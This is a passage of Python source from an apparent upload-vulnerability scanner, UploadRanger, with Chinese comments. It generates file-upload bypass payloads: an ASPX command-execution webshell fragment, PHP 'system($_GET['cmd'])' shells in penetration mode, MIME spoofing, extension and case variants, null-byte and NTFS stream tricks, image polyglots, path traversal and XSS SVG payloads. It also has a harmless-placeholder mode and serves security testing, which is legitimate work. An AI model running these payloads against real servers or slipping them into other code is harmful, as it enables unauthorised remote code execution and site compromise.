    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName=Request["{password}"];
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}}%>""".encode()
    
    def _generate_payloads(self, max_limit: Optional[int] = 200, selected_extensions: Optional[List[str]] = None, 
                          scan_mode: str = "security", webshell_config: Optional[dict] = None) -> List[dict]:
        """生成测试 payloads；max_limit 为 None 时返回完整列表（供指纹过滤后再截断）。

        【BUG-2/3/10修复】调整顺序：高价值绕过扩展名优先；删除与批量section重叠的硬编码列表；
        大小写绕过仅对真正受黑名单限制的扩展名（php/asp/aspx/jsp）生成。
        
        Args:
            max_limit: 最大payload数量限制
            selected_extensions: 用户选择的后缀列表，如 [".php", ".phtml", ".asp"]
            scan_mode: 扫描模式 - security(安全测试) / penetration(渗透测试)
            webshell_config: WebShell配置 {'enabled': True, 'password': 'xxx', 'type': 'xxx'}
        """
        payloads = []
        
        # 获取扫描模式配置
        is_penetration = scan_mode == "penetration"
        shell_pwd = (webshell_config or {}).get("password", "UploadRanger") if is_penetration else "test"
        shell_type = (webshell_config or {}).get("type", "基础eval") if is_penetration else ""
        
        # 解析用户选择的后缀（去掉点号）
        if selected_extensions:
            selected_exts_clean = [ext.lstrip('.') for ext in selected_extensions]
        else:
            selected_exts_clean = None  # None表示全部允许

        # 根据模式选择内容
        from config import VERSION
        if is_penetration:
            # 渗透测试模式 - 使用WebShell内容
            php_content = self._generate_php_webshell(shell_pwd, shell_type)
            jsp_content = self._generate_jsp_webshell(shell_pwd, shell_type)
            aspx_content = self._generate_aspx_webshell(shell_pwd, shell_type)
        else:
            # 安全测试模式 - 使用纯文本内容（不含可执行代码）
            php_content = self._generate_harmless_content("PHP", f"UploadRanger v{VERSION}")
            jsp_content = self._generate_harmless_content("JSP", f"UploadRanger v{VERSION}")
            aspx_content = self._generate_harmless_content("ASP.NET", f"UploadRanger v{VERSION}")

        # 1. 标准WebShell
        # 注意：安全测试模式下，这些也会生成但内容是无害的

        # 只添加用户选择的后缀
        if selected_exts_clean is None or 'php' in selected_exts_clean:
            payloads.append({"type": "php_shell", "ext": "php", "content": php_content, "desc": "标准PHP Shell"})
        if selected_exts_clean is None or 'jsp' in selected_exts_clean:
            payloads.append({"type": "jsp_shell", "ext": "jsp", "content": jsp_content, "desc": "标准JSP Shell"})
        if selected_exts_clean is None or 'aspx' in selected_exts_clean:
            payloads.append({"type": "aspx_shell", "ext": "aspx", "content": aspx_content, "desc": "标准ASPX Shell"})

        # 1.5 【新增】MIME类型伪造 - 专门针对只检查$_FILES['type']的PHP漏洞
        # 保持恶意扩展名，但伪造Content-Type为图片类型
        mime_fake_payloads = [
            ("php", "image/jpeg", php_content),
            ("php", "image/png", php_content),
            ("php", "image/gif", php_content),
            ("php", "image/bmp", php_content),
            ("php", "image/webp", php_content),
            ("asp", "image/jpeg", aspx_content),
            ("aspx", "image/jpeg", aspx_content),
            ("jsp", "image/jpeg", jsp_content),
        ]
        for ext, fake_mime, content in mime_fake_payloads:
            payloads.append({
                "type": f"mime_fake_{fake_mime.replace('/', '_')}",
                "ext": ext,
                "filename": f"shell.{ext}",
                "content": content,
                "desc": f"MIME伪造 {fake_mime} -> .{ext}",
                "fake_content_type": fake_mime,  # 关键：标记需要伪造的Content-Type
            })

        # 2. 【BUG-2修复】PHP扩展名变体 - 黑名单外的有效绕过排在最前
        # 优先测试不在常见黑名单(.php/.asp/.aspx/.jsp)里的变体
        php_bypass_exts = ["phtml", "pht", "phar", "php3", "php4", "php5", "php7", "phps"]
        for ext in php_bypass_exts:
            payloads.append({
                "type": f"php_variant_{ext}",
                "ext": ext,
                "content": php_content,
                "desc": f"PHP变体 .{ext}"
            })

        # 注：section 3（硬编码double_exts）已删除 - 【BUG-3修复】
        # 所有双扩展名组合由下方 section 14a 统一生成，避免重复
        base_name = "shell"
        
        # 4. 空字节注入 - 【新增】更多变体
        null_byte_variants = [
            ("shell.php%00.jpg", "php%00.jpg"),
            ("shell.php%2500.jpg", "php%2500.jpg"),
            ("shell.php\\x00.jpg", "php\\x00.jpg"),
            ("shell.php\\0.jpg", "php\\0.jpg"),
            ("shell.php%2500.png", "php%2500.png"),
            ("shell.php%2500.gif", "php%2500.gif"),
        ]
        for filename, ext in null_byte_variants:
            payloads.append({
                "type": "null_byte_injection",
                "ext": ext,
                "filename": filename,
                "content": php_content,
                "desc": f"空字节注入 {filename}"
            })
        
        # 5. Polyglots / 魔术字节 - 【新增】更多类型
        gif_polyglot = b"GIF89a" + php_content
        payloads.append({
            "type": "polyglot_gif",
            "ext": "php",
            "filename": "logo.gif.php",
            "content": gif_polyglot,
            "desc": "GIF89a Polyglot"
        })
        
        png_magic = b"\x89PNG\r\n\x1a\n"
        png_content = png_magic + php_content
        payloads.append({
            "type": "magic_png",
            "ext": "php",
            "filename": "image.png.php",
            "content": png_content,
            "desc": "PNG魔术字节 + PHP"
        })
        
        jpg_magic = b"\xff\xd8\xff\xe0\x00\x10JFIF"
        jpg_content = jpg_magic + php_content
        payloads.append({
            "type": "magic_jpg",
            "ext": "php",
            "filename": "image.jpg.php",
            "content": jpg_content,
            "desc": "JPEG魔术字节 + PHP"
        })
        
        # 6. XSS SVG - 【新增】更多XSS payload
        svg_payloads = [
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'UploadForge\')"></svg>',
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
            b'<svg/onload=alert(document.domain)>',
            b'<img src=x onerror=alert(1)>',
        ]
        for i, svg in enumerate(svg_payloads):
            payloads.append({
                "type": f"xss_svg_{i}",
                "ext": "svg",
                "content": svg,
                "desc": f"XSS via SVG #{i+1}"
            })
        
        # 7. EICAR测试文件
        eicar_content = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        payloads.append({"type": "eicar", "ext": "txt", "content": eicar_content, "desc": "EICAR测试文件"})
        
        # 8. 尾部点号绕过 (Windows)
        payloads.append({
            "type": "trailing_dot",
            "ext": "php.",
            "filename": "shell.php.",
            "content": php_content,
            "desc": "尾部点号绕过 shell.php."
        })
        
        # 9. 备用数据流 (Windows NTFS)
        payloads.append({
            "type": "alternate_data_stream",
            "ext": "php",
            "filename": "shell.php::$DATA",
            "content": php_content,
            "desc": "NTFS备用数据流 shell.php::$DATA"
        })
        
        # 10. 分号绕过 (IIS)
        payloads.append({
            "type": "semicolon_bypass",
            "ext": "php",
            "filename": "shell.asp;.jpg",
            "content": aspx_content,
            "desc": "分号绕过 (IIS) shell.asp;.jpg"
        })
        payloads.append({
            "type": "semicolon_bypass_jsp",
            "ext": "jsp",
            "filename": "shell.jsp;.jpg",
            "content": jsp_content,
            "desc": "分号绕过 (IIS) shell.jsp;.jpg"
        })
        
        # 11. 【删除】.htaccess 覆盖攻击已移除（安全风险）
        
        # 12. 文件包含 payload（安全模式为纯文本，渗透模式为真实内容）
        from config import VERSION
        safe_include_content = f"<!-- Security Test File - UploadRanger v{VERSION} -->"
        if is_penetration:
            include_payloads = [
                ("shell.php.txt", b"<?php system($_GET['cmd']); ?>"),
                ("config.php.bak", b"<?php system($_GET['cmd']); ?>"),
                ("index.php~", b"<?php system($_GET['cmd']); ?>"),
            ]
        else:
            include_payloads = [
                ("shell.php.txt", safe_include_content.encode()),
                ("config.php.bak", safe_include_content.encode()),
                ("index.php~", safe_include_content.encode()),
            ]
        for filename, content in include_payloads:
            payloads.append({
                "type": "file_include",
                "ext": filename.split('.')[-1],
                "filename": filename,
                "content": content,
                "desc": f"文件包含 {filename}"
            })
        
        # 13. 【新增】更多 ASP/ASPX 变体
        asp_variants = ["asp", "asa", "cer", "aspx", "ashx", "asmx", "asax"]
        for ext in asp_variants:
            payloads.append({
                "type": f"asp_variant_{ext}",
                "ext": ext,
                "content": aspx_content,
                "desc": f"ASP变体 .{ext}"
            })

        # 13.5 Windows可执行文件上传测试
        # 安全模式：纯文本内容；渗透模式：PE文件头
        from config import VERSION
        if is_penetration:
            pe_header = b"MZ" + b"\x00" * 58 + b"PE\x00\x00" + b"\x00" * 20
            exe_content = pe_header + f"<!-- UploadRanger v{VERSION} -->".encode()
        else:
            exe_content = f"<!-- Security Test File (EXE Placeholder) - UploadRanger v{VERSION} -->".encode()
        
        # Windows可执行文件扩展名
        exe_exts = [
            ("exe", "Windows可执行文件"),
            ("scr", "屏幕保护程序"),
            ("pif", "程序信息文件"),
            ("com", "DOS可执行文件"),
            ("dll", "动态链接库"),
        ]
        
        for ext, desc in exe_exts:
            payloads.append({
                "type": f"windows_executable_{ext}",
                "ext": ext,
                "content": exe_content,
                "desc": f"Windows {desc} .{ext}"
            })
            # 双扩展名绕过
            payloads.append({
                "type": f"windows_executable_{ext}_double",
                "ext": ext,
                "filename": f"shell.{ext}.jpg",
                "content": exe_content,
                "desc": f"Windows {desc} 双扩展名 .{ext}.jpg",
                "fake_content_type": "image/jpeg"
            })
            # 空字节绕过
            payloads.append({
                "type": f"windows_executable_{ext}_null",
                "ext": ext,
                "filename": f"shell.{ext}%00.jpg",
                "content": exe_content,
                "desc": f"Windows {desc} 空字节 .{ext}%00.jpg",
                "fake_content_type": "image/jpeg"
            })
            # 尾部点号（Windows特性）
            payloads.append({
                "type": f"windows_executable_{ext}_dot",
                "ext": ext,
                "filename": f"shell.{ext}.",
                "content": exe_content,
                "desc": f"Windows {desc} 尾部点号 .{ext}.",
            })
            # ADS备用数据流
            payloads.append({
                "type": f"windows_executable_{ext}_ads",
                "ext": ext,
                "filename": f"shell.{ext}::$DATA",
                "content": exe_content,
                "desc": f"Windows {desc} ADS .{ext}::$DATA",
            })
        
        # Windows脚本文件（安全模式：纯文本；渗透模式：真实脚本）
        if is_penetration:
            bat_content = b"@echo off\r\necho UploadRanger_Penetration_Test\r\n"
            ps1_content = b"Write-Output 'UploadRanger_PS1_Test'\r\n"
            vbs_content = b"WScript.Echo \"UploadRanger_VBS_Test\"\r\n"
        else:
            bat_content = f"@REM Security Test Script - UploadRanger v{VERSION}\r\n@REM This is a harmless test file\r\n".encode()
            ps1_content = f"# Security Test Script - UploadRanger v{VERSION}\r\n# This is a harmless test file\r\n".encode()
            vbs_content = f"' Security Test Script - UploadRanger v{VERSION}\r\n' This is a harmless test file\r\n".encode()
        
        script_payloads = [
            ("bat", bat_content, "批处理文件"),
            ("cmd", bat_content, "命令脚本"),
            ("ps1", ps1_content, "PowerShell脚本"),
            ("vbs", vbs_content, "VBScript"),
            ("js", (b"// UploadRanger_JS_Test" if is_penetration else f"// Security Test Script - UploadRanger v{VERSION}".encode()), "JScript"),
            ("hta", (b"<script>alert('UploadRanger_HTA_Test')</script>" if is_penetration else f"<!-- Security Test File - UploadRanger v{VERSION} -->".encode()), "HTML应用程序"),
            ("wsf", (b"<job><script language=\"JScript\">WScript.Echo('UploadRanger_WSF_Test')</script></job>" if is_penetration else f"<!-- Security Test File - UploadRanger v{VERSION} -->".encode()), "Windows脚本文件"),
        ]
        
        for ext, content, desc in script_payloads:
            if isinstance(content, bytes):
                pass
            else:
                content = content.encode()
            payloads.append({
                "type": f"windows_script_{ext}",
                "ext": ext,
                "content": content,
                "desc": f"Windows {desc} .{ext}"
            })
            # 双扩展名绕过
            payloads.append({
                "type": f"windows_script_{ext}_double",
                "ext": ext,
                "filename": f"shell.{ext}.txt",
                "content": content,
                "desc": f"Windows {desc} 双扩展名 .{ext}.txt",
                "fake_content_type": "text/plain"
            })

        # 14. 扩展：批量绕过变体（用于把"Payload上限"真正变成"可扩展的词库"）
        # 【删除】压缩包相关已移除（zip、rar、7z、tar、gz、bz2）
        safe_exts = [
            "jpg", "jpeg", "png", "gif", "bmp", "webp", "ico", "svg",
            "txt", "log", "csv", "json", "xml", "yml", "yaml", "ini",
            "html", "htm", "css", "js", "map",
            "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
            "mp3", "mp4", "avi", "mov",
        ]
        # 【BUG-2修复】黑名单外的高效绕过扩展名排在前面，.php/.asp等常见黑名单排在后面
        malicious_variants = [
            # 优先：不在常见黑名单里，成功率高
            ("phtml", php_content),
            ("pht", php_content),
            ("phar", php_content),
            ("php3", php_content),
            ("php4", php_content),
            ("php5", php_content),
            ("php7", php_content),
            ("jspx", jsp_content),
            ("jspf", jsp_content),
            ("ashx", aspx_content),
            ("asmx", aspx_content),
            ("asax", aspx_content),
            ("asa", aspx_content),
            ("cer", aspx_content),
            # 后置：常见黑名单扩展名，多数情况下会被拦截
            ("php", php_content),
            ("jsp", jsp_content),
            ("aspx", aspx_content),
            ("asp", aspx_content),
        ]

        # 【BUG-10修复】大小写绕过仅对真正受黑名单限制的扩展名有意义
        # phtml/phar/php3/php4/php5/pht 本身不在常见黑名单，大小写变体无意义
        blacklisted_exts_for_case_bypass = {
            "php": php_content,
            "asp": aspx_content,
            "aspx": aspx_content,
            "jsp": jsp_content,
        }

        def _add_filename_payload(typ: str, filename: str, content: bytes, desc: str):
            payloads.append(
                {
                    "type": typ,
                    "ext": filename.rsplit(".", 1)[-1] if "." in filename else "bin",
                    "filename": filename,
                    "content": content,
                    "desc": desc,
                }
            )

        # 14a. 双扩展名组合（shell.{mal}.{safe} / shell.{safe}.{mal}）
        for mal_ext, mal_content in malicious_variants:
            for safe in safe_exts:
                _add_filename_payload(
                    f"double_ext_{mal_ext}_{safe}",
                    f"{base_name}.{mal_ext}.{safe}",
                    mal_content,
                    f"双扩展名 {mal_ext}.{safe}",
                )
                _add_filename_payload(
                    f"double_ext_{safe}_{mal_ext}",
                    f"{base_name}.{safe}.{mal_ext}",
                    mal_content,
                    f"反向双扩展名 {safe}.{mal_ext}",
                )

        # 14b. 【BUG-10修复】大小写绕过仅对黑名单扩展名（php/asp/aspx/jsp）生成
        # 【BUG-3修复】capitalize 与 first_upper_rest_lower 对短扩展名结果相同，去掉冗余
        case_variant_funcs = [
            lambda s: s.upper(),       # PHP / ASP / ASPX / JSP
            lambda s: s.capitalize(),  # Php / Asp / Aspx / Jsp
        ]
        for mal_ext, mal_content in blacklisted_exts_for_case_bypass.items():
            for fn_case in case_variant_funcs:
                v = fn_case(mal_ext)
                _add_filename_payload(
                    f"case_bypass_{mal_ext}",
                    f"{base_name}.{v}",
                    mal_content,
                    f"大小写绕过 .{v}",
                )

        # 14c. 特殊字符/分隔符（IIS/代理/后端解析差异）
        for mal_ext, mal_content in malicious_variants:
            _add_filename_payload(
                f"special_sep_{mal_ext}",
                f"{base_name}.{mal_ext};.jpg",
                mal_content,
                f"分隔符绕过 {mal_ext};.safe",
            )
            _add_filename_payload(
                f"space_bypass_{mal_ext}",
                f"{base_name}.{mal_ext} .jpg",
                mal_content,
                f"空格绕过 {mal_ext} .safe",
            )
            _add_filename_payload(
                f"trailing_space_{mal_ext}",
                f"{base_name}.{mal_ext} ",
                mal_content,
                f"尾随空格 .{mal_ext}␠",
            )

        # 14d. 路径穿越（仅文件名层面，真实是否可用取决于服务端拼接方式）
        traversal_prefixes = ["../", "..\\", "..%2f", "..%5c", ".%2e/", ".%2e%2e/"]
        for mal_ext, mal_content in malicious_variants:
            for pref in traversal_prefixes:
                _add_filename_payload(
                    f"path_traversal_{mal_ext}",
                    f"{pref}{base_name}.{mal_ext}",
                    mal_content,
                    f"路径穿越 {pref}{base_name}.{mal_ext}",
                )
        
        # 【BUG-3修复】全局去重：硬编码 section 与批量 section 可能存在重名，
        # 按文件名去重（随机名的 payload 无 filename 键，不参与去重）
        seen_filenames: set = set()
        deduped: List[dict] = []
        for p in payloads:
            fn = p.get("filename")
            if fn:
                if fn in seen_filenames:
                    continue
                seen_filenames.add(fn)
            deduped.append(p)
        
        # 【新增】根据用户选择的后缀过滤payloads
        if selected_exts_clean is not None:
            filtered: List[dict] = []
            for p in deduped:
                payload_ext = p.get("ext", "")
                # 检查payload的扩展名是否在用户选择的后缀中
                # 或者扩展名在恶意变体列表中（会被二次扩展名绕过使用）
                malicious_variants_exts = {"php", "phtml", "pht", "phar", "php3", "php4", "php5", "php7", 
                                           "asp", "aspx", "asa", "cer", "cdx", "ashx", "asmx", "asax",
                                           "jsp", "jspx", "jspf", "jhtml", "pl", "cgi", "py"}
                if payload_ext in selected_exts_clean or payload_ext in malicious_variants_exts:
                    filtered.append(p)
            deduped = filtered

        if max_limit is not None:
            return deduped[:max_limit]
        return deduped
    
    def stop(self):
        """停止扫描"""
        self.running = False


_BUILTIN_ASYNC_PAYLOAD_COUNT: Optional[int] = None


def get_builtin_async_payload_count() -> int:
    """内置异步快速扫描词库条数（与 Payload 数量上限取 min 后才是实际请求数）。"""
    global _BUILTIN_ASYNC_PAYLOAD_COUNT
    if _BUILTIN_ASYNC_PAYLOAD_COUNT is None:
        _BUILTIN_ASYNC_PAYLOAD_COUNT = len(AsyncScanner()._generate_payloads(None))
    return _BUILTIN_ASYNC_PAYLOAD_COUNT
